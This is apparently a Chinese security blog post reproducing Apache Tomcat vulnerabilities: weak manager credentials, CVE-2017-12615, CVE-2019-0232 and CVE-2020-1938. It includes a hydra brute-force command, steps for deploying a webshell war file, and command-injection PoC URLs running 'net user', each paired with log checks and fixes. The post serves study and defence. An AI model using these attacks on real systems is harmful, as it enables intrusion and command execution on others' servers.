# Tomcat常见漏洞复现



#### 后台管理页面弱口令
默认：`http://127.0.0.1:8080/manager/html`页面只允许本地访问，除非管理员手工修改了这些属性

**1.尝试登录后台**
1.尝试默认账户密码：`tomcat:tomcat`
2.如果不是，尝试用弱口令字典进行爆破
```bash
# hydra爆破manager后台
hydra -L user.txt -P user.txt -f 10.10.10.81 -s 8080 http-get /manager/html
```

**2.部署war包**
```
# war包生成
jar -cvf xx.war xx.jsp
```
![](http://image.xpshuai.cn/tomcat_gen_war.png)

**3.部署后, 访问马**
访问 `http://127.0.0.1:8080/war 包名(无后缀) / 包名内文件名` 

**4.后续操作**


###### 安全检查
查看tomcat日志
```bash
tail /root/tomcats/apache-tomcat-xxx/logs/xxxx_log
# 如果出现大量401，就可能正在被爆破
```

查看部署的war包
```bash
# 部署路径在tomcat的webapps目录下，进行检查

# 查看部署war包的日志(tomcat的logs下)，是否有部署的痕迹
```


###### 修复建议
1. 若无必要,取消 manager/html 功能。
2. 若要使用, manager 页面应只允许本地 IP 访问




#### 任意文件写入(CVE-2017-12615)
漏洞本质是 Tomcat 配置文件 /conf/web.xml 配置了可写( readonly=false ),导致我们可以往服务器写文件:

**条件：**
1. 服务器开启了put方法； 
2. 同时tomcat存在后缀解析漏洞

###### 复现
正常状况：
![](http://image.xpshuai.cn/tomcat_file_w_ok.png)
利用成功：
![](http://image.xpshuai.cn/tomcat_file_w_ok.png)
![](http://image.xpshuai.cn/tomcat_CVE20190232_ok.png)


###### 安全检查
查看日志内容，如果方法是PUT， 且状态码为201，就要注意了

###### 防御措施
1. 禁用PUT方法(默认是禁止的，开启REST API的情况下可能会开启  --> 和业务保持沟通)
2. 设置强密码或删除Web控制台，以及示例页面(可能暴露信息)，关闭报错页面提示
3. 将 readonly=true ,默认为 true 



#### 远程代码执行(CVE-2019-0232)
影响范围: 9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 , 7.0.0 ~ 7.0.93
影响系统: Windows

###### 环境搭建
手头暂时没windows系统，从网上借鉴了一下

配置Apache Tomcat服务器（修改conf目录配置文件，启用CGI）
1、打开Tomcat安装目录的apache-tomcat-8.5.39\conf\web.xml修改如下配置，在默认情况下配置是注释的。
![](http://image.xpshuai.cn/tomcat_CVE20190232.png)

 

2、打开Tomcat安装目录的`apache-tomcat-8.5.39\conf\context.xml`修改如下配置，添加privileged="true" 。
![](http://image.xpshuai.cn/tomcat_CVE20190232_2.png)


3、在apache-tomcat-8.5.39\webapps\ROOT\WEB-INF目录新建一个cgi-bin文件夹，创建一个test.bat的文件，内容随意


###### 漏洞利用
POC
```
# 访问
http://127.0.0.1:8080/cgi-bin/test.bat?&dir

# 执行命令
http://127.0.0.1:8080/cgi-bin/test.bat?&C:/WINDOWS/system32/net+user
```

**Note:**
net 命令的路径要写全,直接写 net user , Tomcat 控制台会提示net 不是内部命令,也不是可运行的程序,另 `必须使用 + 号连接`,使用 空格 ,%2B 都会执
行失败,控制台报错。



#### 文件包含漏洞(CVE-2020-1938)
该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。目前，厂商已发布新版本完成漏洞修复。

**受影响版本**
- Apache Tomcat 6
- Apache Tomcat 7 < 7.0.100
- Apache Tomcat 8 < 8.5.51
- Apache Tomcat 9 < 9.0.31

**不受影响版本**
- Apache Tomcat = 7.0.100
- Apache Tomcat = 8.5.51
- Apache Tomcat = 9.0.31


###### 文件包含RCE复现
**POC：**
https://github.com/0nise/CVE-2020-1938
https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-Ajp-lfi-POC

利用文章：
https://www.cnblogs.com/Rain99-/p/12517660.html
https://blog.csdn.net/SouthWind0/article/details/105147369/


###### 防护措施
1. 更新到安全版本
2. 关闭AJP服务，修改Tomcat配置文件Service.xml,注释掉：`<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />`
3. 配置ajp配置中的secretRequired跟secret属性来限制认证


###### 参考
https://www.cnvd.org.cn/webinfo/show/5415





---

> 作者: [剑胆琴心](http://geoer.cn)  
> URL: https://shuai06.github.io/tomcat%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/  

